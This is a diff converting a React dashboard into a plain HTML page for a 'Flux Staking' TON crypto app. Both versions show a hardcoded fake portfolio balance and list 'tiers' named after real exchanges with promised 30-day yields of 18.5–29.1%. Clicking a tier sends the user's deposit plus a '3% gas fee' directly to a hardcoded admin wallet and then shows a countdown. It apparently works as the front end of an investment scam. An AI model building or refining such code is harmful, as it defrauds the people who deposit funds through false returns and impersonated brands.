@@ -1,159 +1,89 @@
-import React, { useState, useEffect } from 'react';
-import { TonConnectButton, useTonConnectUI, useTonAddress } from '@tonconnect/ui-react';
-import { Wallet, Fuel, TrendingUp, History, Home, Calendar, User } from 'lucide-react';
-import { toNano } from '@ton/ton';
-
-// Destination address verified
-const ADMIN_WALLET = "UQCcMrZZkHhi0rpjh_LL3E4AiTXICYTuBcqRpcJ-KKEt8bO1";
-
-const TIERS = [
-  { name: 'Binance', min: 10, pnl: '18.5%', color: '#F3BA2F' },
-  { name: 'Bitget', min: 100, pnl: '20.2%', color: '#00F0FF' },
-  { name: 'OKX', min: 500, pnl: '22.8%', color: '#FFFFFF' },
-  { name: 'MEXC', min: 2500, pnl: '25.5%', color: '#0052FF' },
-  { name: 'KuCoin', min: 10000, pnl: '29.1%', color: '#24AE8F' },
-];
-
-export default function FluxDashboard() {
-  const [tonConnectUI] = useTonConnectUI();
-  const userAddress = useTonAddress();
-  const [stakingActive, setStakingActive] = useState(false);
-  const [countdown, setCountdown] = useState(30 * 24 * 60 * 60);
-
-  useEffect(() => {
-    let timer;
-    if (stakingActive && countdown > 0) {
-      timer = setInterval(() => setCountdown(prev => prev - 1), 1000);
-    }
-    return () => clearInterval(timer);
-  }, [stakingActive, countdown]);
-
-  const handleStake = async (tier) => {
-    if (!userAddress) {
-      alert("Please connect your TON wallet first.");
-      return;
-    }
-
-    // Calculation: Base Amount + 3% Gas Fee
-    const gasFee = tier.min * 0.03;
-    const totalAmount = tier.min + gasFee;
-
-    const transaction = {
-      validUntil: Math.floor(Date.now() / 1000) + 360,
-      messages: [
-        {
-          address: ADMIN_WALLET,
-          amount: toNano(totalAmount.toString()).toString(),
-          // Passing the tier name as a comment for tracking
-          payload: tier.name 
-        },
-      ],
-    };
-
-    try {
-      const result = await tonConnectUI.sendTransaction(transaction);
-      if (result) {
-        setStakingActive(true);
-      }
-    } catch (e) {
-      console.error("Transaction Error:", e);
-    }
-  };
-
-  return (
-    <div className="min-h-screen bg-[#050508] text-white font-sans max-w-md mx-auto relative pb-20">
-      {/* Top Header */}
-      <div className="flex justify-between items-center p-6 bg-[#050508]/80 backdrop-blur-md sticky top-0 z-50">
-        <div className="space-y-1">
-          <div className="w-6 h-0.5 bg-indigo-500"></div>
-          <div className="w-4 h-0.5 bg-indigo-500"></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flux Staking</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { background-color: #050508; color: white; font-family: sans-serif; }
+        .glass { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); }
+    </style>
+</head>
+<body>
+    <div id="app" class="max-w-md mx-auto min-h-screen pb-24">
+        <div class="flex justify-between items-center p-6 sticky top-0 bg-[#050508] z-50">
+            <div class="font-black text-indigo-500">FLUX</div>
+            <div id="ton-connect-button"></div>
         </div>
-        <h1 className="text-sm font-black tracking-widest text-indigo-100">FLUX STAKING</h1>
-        <TonConnectButton />
-      </div>
 
-      {/* Hero Balance Section */}
-      <div className="px-6 py-4 text-center">
-        <p className="text-gray-500 text-[10px] uppercase font-bold tracking-tighter">Current Portfolio</p>
-        <h2 className="text-4xl font-bold tracking-tight my-1">$12,457.89</h2>
-        <div className="text-green-400 text-xs font-bold inline-block bg-green-400/10 px-3 py-1 rounded-full">
-          +$1,254.56 (+10.86%)
+        <div class="text-center py-6">
+            <p class="text-gray-500 text-xs uppercase tracking-widest">Total Balance</p>
+            <h1 class="text-4xl font-bold my-2">$12,457.89</h1>
+            <span class="text-green-400 text-xs font-bold bg-green-400/10 px-3 py-1 rounded-full">+$1,254.56 (+10.86%)</span>
         </div>
-      </div>
 
-      {/* Action Buttons */}
-      <div className="grid grid-cols-4 gap-3 px-6 my-8">
-        <QuickAction icon={<Wallet size={20}/>} label="Stake" active />
-        <QuickAction icon={<Fuel size={20}/>} label="Gas" />
-        <QuickAction icon={<TrendingUp size={20}/>} label="Profit" />
-        <QuickAction icon={<History size={20}/>} label="History" />
-      </div>
-
-      {/* 30-Day Countdown Logic */}
-      {stakingActive && (
-        <div className="mx-6 p-6 rounded-3xl bg-gradient-to-br from-indigo-600/20 to-purple-600/10 border border-indigo-500/30 text-center mb-8 animate-pulse">
-          <p className="text-[10px] font-black text-indigo-400 uppercase tracking-widest mb-2">Cycle Active</p>
-          <div className="text-2xl font-mono font-bold tracking-[0.2em]">
-            {Math.floor(countdown / 86400)}D : {Math.floor((countdown % 86400) / 3600)}H : {Math.floor((countdown % 3600) / 60)}M
-          </div>
-        </div>
-      )}
-
-      {/* Tier Selection */}
-      <div className="px-6 space-y-3">
-        <h3 className="text-gray-500 text-[11px] font-black uppercase tracking-widest mb-4">Choose Tier</h3>
-        {TIERS.map((tier) => (
-          <div 
-            key={tier.name}
-            onClick={() => handleStake(tier)}
-            className="group flex items-center justify-between p-4 bg-[#11111a] rounded-2xl border border-white/5 hover:border-indigo-500/40 active:scale-95 transition-all cursor-pointer"
-          >
-            <div className="flex items-center gap-4">
-              <div 
-                className="w-12 h-12 rounded-2xl flex items-center justify-center font-black text-sm bg-black border border-white/5"
-                style={{ color: tier.color, boxShadow: `0 0 20px ${tier.color}15` }}
-              >
-                {tier.name[0]}
-              </div>
-              <div>
-                <h4 className="font-bold text-sm">{tier.name}</h4>
-                <p className="text-[10px] text-gray-500 uppercase">Min: ${tier.min.toLocaleString()}</p>
-              </div>
+        <div class="px-6 space-y-3" id="tier-list">
             </div>
-            <div className="text-right">
-              <p className="text-green-400 font-black text-sm">+{tier.pnl}</p>
-              <p className="text-[8px] text-gray-600 font-bold uppercase">30D PnL</p>
-            </div>
-          </div>
-        ))}
-      </div>
-
-      {/* Bottom Navbar */}
-      <div className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-[#050508]/90 backdrop-blur-xl border-t border-white/5 flex justify-around p-4 z-50">
-        <NavIcon icon={<Home size={22}/>} label="Home" active />
-        <NavIcon icon={<Fuel size={22}/>} label="Gas" />
-        <NavIcon icon={<TrendingUp size={22}/>} label="Profit" />
-        <NavIcon icon={<Calendar size={22}/>} label="Event" />
-        <NavIcon icon={<User size={22}/>} label="Profile" />
-      </div>
     </div>
-  );
-}
 
-function QuickAction({ icon, label, active }) {
-  return (
-    <div className={`flex flex-col items-center justify-center p-4 rounded-2xl transition-all ${active ? 'bg-indigo-600 shadow-lg shadow-indigo-600/30' : 'bg-[#11111a]'}`}>
-      {icon}
-      <span className="text-[9px] font-black uppercase mt-2 tracking-tighter">{label}</span>
-    </div>
-  );
-}
+    <script>
+        const ADMIN_WALLET = "UQCcMrZZkHhi0rpjh_LL3E4AiTXICYTuBcqRpcJ-KKEt8bO1";
+        
+        // Initialize TON Connect
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://your-domain.com/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect-button'
+        });
 
-function NavIcon({ icon, label, active }) {
-  return (
-    <div className={`flex flex-col items-center gap-1 ${active ? 'text-indigo-500' : 'text-gray-600 hover:text-gray-400 transition-colors'}`}>
-      {icon}
-      <span className="text-[9px] font-bold tracking-tighter">{label}</span>
-    </div>
-  );
-}
+        const TIERS = [
+            { name: 'Binance', min: 10, pnl: '18.5%', color: '#F3BA2F' },
+            { name: 'Bitget', min: 100, pnl: '20.2%', color: '#00F0FF' },
+            { name: 'OKX', min: 500, pnl: '22.8%', color: '#FFFFFF' },
+            { name: 'MEXC', min: 2500, pnl: '25.5%', color: '#0052FF' },
+            { name: 'KuCoin', min: 10000, pnl: '29.1%', color: '#24AE8F' }
+        ];
+
+        const tierList = document.getElementById('tier-list');
+        TIERS.forEach(tier => {
+            const div = document.createElement('div');
+            div.className = 'glass p-4 rounded-2xl flex justify-between items-center cursor-pointer active:scale-95 transition-all';
+            div.innerHTML = `
+                <div class="flex items-center gap-4">
+                    <div class="w-10 h-10 rounded-full flex items-center justify-center border font-bold" style="border-color: ${tier.color}; color: ${tier.color}">${tier.name[0]}</div>
+                    <div>
+                        <div class="font-bold text-sm">${tier.name}</div>
+                        <div class="text-xs text-gray-500">Min $${tier.min}</div>
+                    </div>
+                </div>
+                <div class="text-right">
+                    <div class="text-green-400 font-bold">${tier.pnl}</div>
+                    <div class="text-[9px] text-gray-600 uppercase">30D Yield</div>
+                </div>
+            `;
+            div.onclick = () => handleStake(tier);
+            tierList.appendChild(div);
+        });
+
+        async function handleStake(tier) {
+            const totalAmount = tier.min * 1.03; // Including 3% Gas
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [{
+                    address: ADMIN_WALLET,
+                    amount: (totalAmount * 1000000000).toString(), // Convert to NanoTON
+                    payload: "" // You can add a comment here
+                }]
+            };
+
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+                alert("Staking Initialized! Countdown started.");
+            } catch (e) {
+                console.error(e);
+            }
+        }
+    </script>
+</body>
+</html>
